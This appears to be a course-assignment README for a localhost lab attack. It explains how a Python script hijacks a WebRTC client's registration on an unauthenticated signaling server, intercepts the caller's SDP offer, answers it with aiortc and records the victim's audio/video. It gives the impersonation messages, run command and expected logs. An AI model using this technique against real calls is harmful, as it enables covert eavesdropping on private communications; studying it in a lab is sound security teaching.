# NS_A2 – Part 2.3: WebRTC Media Interception (`webrtc_media`)

This folder contains the **advanced attacker** for **Task 2.3 – Media Interception**.

The goal is to **hijack the registration** of a WebRTC client (e.g., `client-a`), then
**intercept the WebRTC offer from Client B**, create our own `RTCPeerConnection`
using `aiortc`, send back an SDP answer, and **receive/record the media stream**.

---

## 1. Files and Structure

```text
webrtc_media/
  interceptor_webrtc.py    # Advanced attacker (media interception)
  requirements.txt         # Python dependencies for this part only
  recordings/              # Output folder for recorded media (not tracked in git)
```

- **`interceptor_webrtc.py`**  
  Python script that:
  1. Connects to the signaling server (WebSocket).
  2. Registers as the victim (`clientId = client-a` by default).
  3. Waits for a WebRTC `offer` addressed to `client-a`.
  4. Uses `aiortc` to create a `RTCPeerConnection`.
  5. Sends an SDP `answer` back to the caller (`client-b`).
  6. Handles ICE candidates in both directions.
  7. Saves incoming media to `recordings/intercepted_media.mp4`.

- **`requirements.txt`**  
  Minimal dependencies for this part:
  - `websockets` – for the WebSocket signaling channel.
  - `aiortc` – WebRTC stack for Python, including media handling.

- **`recordings/`**  
  All recorded media files (e.g., `intercepted_media.mp4`) are written here.
  This folder is meant to be **ignored by git**.

---

## 2. Prerequisites

### 2.1 System Requirements

- **Python 3.10+** (same environment you used for Part 2.1 is fine, but here
  we use a **separate virtual environment** inside `webrtc_media/`).
- **ffmpeg** installed on your system (required by `aiortc` / `av` for media
  recording to `.mp4`). On Ubuntu/Debian:

  ```bash
  sudo apt-get update
  sudo apt-get install -y ffmpeg
  ```

- The **signaling server** and WebRTC demo must already be running (same as in Part 2.1 / 2.2).  
  Typically:
  - Signaling server listening on `ws://localhost:8080`
  - Browser-based clients:
    - `Client A` at `http://localhost:3001`
    - `Client B` at `http://localhost:3002`

> If your setup uses a WebSocket **proxy** (e.g., `ws-proxy` listening on `ws://localhost:8081`
> and forwarding to `ws://localhost:8080`), keep that running exactly as in Part 2.2.
> In this README we assume the effective signaling endpoint is `ws://localhost:8080`.

---

### 2.2 Create and Activate the Virtual Environment (local to `webrtc_media/`)

From your home directory:

```bash
cd ~/NS_A2/part2_attack/webrtc_media

# Create a new virtual environment ONLY for Part 2.3
python3 -m venv .venv

# Activate the environment (Linux/macOS)
source .venv/bin/activate

# On Windows (PowerShell)
# .venv\Scripts\Activate.ps1
```

Install the dependencies:

```bash
pip install --upgrade pip
pip install -r requirements.txt
```

You can verify the installation:

```bash
python -c "import websockets, aiortc; print('OK - websockets & aiortc import succeeded')"
```

---

## 3. How the Advanced Attacker Works (High-Level Design)

### 3.1 Registration Hijacking

1. The script connects to the signaling server at `--server-url`  
   (default: `ws://localhost:8080`).

2. It sends a **registration message**:

   ```json
   {
     "type": "register",
     "clientId": "client-a",
     "meta": {
       "displayName": "webrtc-attacker-client-a"
     }
   }
   ```

3. The signaling server responds with:

   ```json
   {
     "type": "registered",
     "clientId": "client-a"
   }
   ```

4. From this point on, the server believes **our attacker** is the legitimate
   `client-a`. Any new offers or ICE candidates addressed to `client-a`
   will come to us instead of the real browser tab.

### 3.2 Intercepting the Offer

- The script waits for the first WebSocket message with:

  ```json
  {
    "type": "offer",
    "to": "client-a",
    "sdp": "...",
    "from": "client-b"
  }
  ```

- When this is received, the script:
  1. Logs that it has intercepted an offer from `client-b` intended for `client-a`.
  2. Creates an `RTCPeerConnection` and a `MediaRecorder`.
  3. Sets the **remote description** with the received `sdp` (type `"offer"`).

### 3.3 Creating the Answer

- Once the remote offer is set, the script:
  1. Calls `createAnswer()` to generate an SDP answer.
  2. Calls `setLocalDescription()` with that answer.
  3. Sends back a WebSocket message:

     ```json
     {
       "type": "answer",
       "to": "client-b",
       "sdp": "<answer_sdp_here>"
     }
     ```

- At this point, **from Client B’s point of view**, it has successfully set a
  remote description from what it believes is `client-a`, but in reality
  it is our Python attacker.

### 3.4 ICE Candidates

- Incoming ICE from Client B:

  ```json
  {
    "type": "ice",
    "to": "client-a",
    "candidate": {
      "candidate": "candidate:...",
      "sdpMid": "0",
      "sdpMLineIndex": 0,
      "usernameFragment": "..."
    },
    "from": "client-b"
  }
  ```

  The script:
  - Parses the JSON.
  - Builds an `RTCIceCandidate`.
  - Calls `pc.addIceCandidate(...)`.

- Outgoing ICE from the attacker:

  - When the local ICE agent finds new candidates, the script:
    - Packages them into the same JSON structure (but with `to = "client-b"`).
    - Sends them via the WebSocket to the signaling server.
    - The signaling server forwards them to Client B.

### 3.5 Media Handling

- `MediaRecorder` is configured to write to:

  ```text
  recordings/intercepted_media.mp4
  ```

- When the first remote track arrives:
  - The `on("track")` event handler:
    - Logs the track kind (`audio` / `video`).
    - Attaches it to the recorder with `recorder.addTrack(track)`.
    - Starts the recorder (only once).

- When the connection eventually closes (WebSocket disconnect, call ended, etc.):
  - The script stops the recorder.
  - Closes the `RTCPeerConnection`.
  - Logs the cleanup steps.

---

## 4. Step-by-Step Execution Scenario for Task 2.3

This is a **clean, reproducible scenario** that emphasizes media interception.

### 4.1 Start the Signaling/WebRTC Demo

1. Make sure your **signaling server** is running and listening on `ws://localhost:8080`.  
   (Exactly as you used it in Tasks 2.1 and 2.2.)

2. Make sure your **WebRTC browser clients** are accessible:
   - `Client A` UI – typically `http://localhost:3001`
   - `Client B` UI – typically `http://localhost:3002`

3. If you use a `ws-proxy` (e.g., `ws://localhost:8081` → `ws://localhost:8080`),
   start it as usual. The attacker directly targets `ws://localhost:8080`.

### 4.2 Start the Advanced Attacker

In a terminal:

```bash
cd ~/NS_A2/part2_attack/webrtc_media
source .venv/bin/activate

python interceptor_webrtc.py       --server-url ws://localhost:8080       --victim-id client-a       --output recordings/intercepted_media.mp4
```

You should see log lines similar to:

```text
[2025-11-20T23:01:38Z] [*] Starting WebRTC media interception attack:
[2025-11-20T23:01:38Z] [*] Connecting to signaling server at 'ws://localhost:8080' ...
[2025-11-20T23:01:38Z] [+] Connected to signaling server.
[2025-11-20T23:01:38Z] [C → S] Registration message (impersonating 'client-a'): {...}
[2025-11-20T23:01:38Z] [*] Waiting to intercept the first WebRTC 'offer' ...
```

The script is now:
- Registered as `client-a`.
- Ready to intercept **any offer** that targets `client-a`.

### 4.3 Use Client B to Initiate the Call

1. Open `Client B` in the browser (e.g. `http://localhost:3002`).
2. Follow the app’s normal flow to call `client-a`:
   - For example, click **“Ready”** / **“Start / Offer”** / **“Call client-a”** depending
     on the exact UI labels of your demo.
3. When Client B sends the offer, the attacker should log:

   ```text
   [+] Intercepted WebRTC offer from caller 'client-b' intended for victim 'client-a'.
   [*] Recorded media will be saved to: 'recordings/intercepted_media.mp4'
   [*] RTCPeerConnection created.
   [*] Creating SDP answer ...
   [C → S] Sending intercepted SDP answer back to caller 'client-b'.
   ```

4. After ICE exchange, you should see:

   ```text
   [+] New incoming media track: kind='video'
   [*] Track attached to MediaRecorder.
   [*] Starting MediaRecorder ...
   [+] MediaRecorder started.
   ```

From Client B’s perspective, it now believes it is streaming media to `client-a`,
but the **Python attacker** is the one receiving and recording it.

---

## 5. Verifying the Recorded Media

1. Once you stop the call (or close the browser tab / stop the script), the attacker will log:

   ```text
   [*] Cleaning up: stopping recorder and closing RTCPeerConnection.
   [+] MediaRecorder stopped.
   [+] RTCPeerConnection closed.
   ```

2. Check the output file:

   ```bash
   ls recordings/
   # You should see something like:
   # intercepted_media.mp4
   ```

3. Play the file with any media player (e.g., VLC):

   ```bash
   vlc recordings/intercepted_media.mp4
   ```

4. Take a **screenshot** of:
   - The attacker terminal showing the interception logs.
   - The media player showing the intercepted video stream.

These screenshots can be used as deliverables for **Task 2.3**.

---

## 6. Notes and Troubleshooting

- If the script complains about `ffmpeg` or fails to write the `.mp4` file:
  - Ensure `ffmpeg` is installed and visible in `PATH`.
  - Try recording **only audio** or use a different container (e.g., `.mkv`) if needed.

- If no offer is intercepted:
  - Verify that the attacker is registered as `client-a` **before** Client B sends the offer.
  - Check that the signaling server still uses the protocol:
    ```json
    { "type": "offer", "to": "client-a", "sdp": "...", "from": "client-b" }
    ```

- If ICE fails:
  - Make sure you are testing on **localhost** or a simple LAN environment.
  - Complex NAT/firewall setups may require STUN/TURN configuration in both the
    browser app and aiortc.

---

## 7. Relation to Part 2.1 / 2.2

- **Part 2.1**: Showed that registration is **unauthenticated** and allows
  arbitrary clients to register any `clientId`.

- **Part 2.2**: Demonstrated that after hijacking registration, the attacker
  can intercept **signaling messages** (e.g., `offer`, `answer`, `ice`).

- **Part 2.3** (this part): Extends the attack to **full media interception**:
  the attacker not only sees the signaling, but also establishes a WebRTC
  connection and records the actual audio/video stream intended for the victim.

This completes the advanced challenge requirements for Task 2.3.
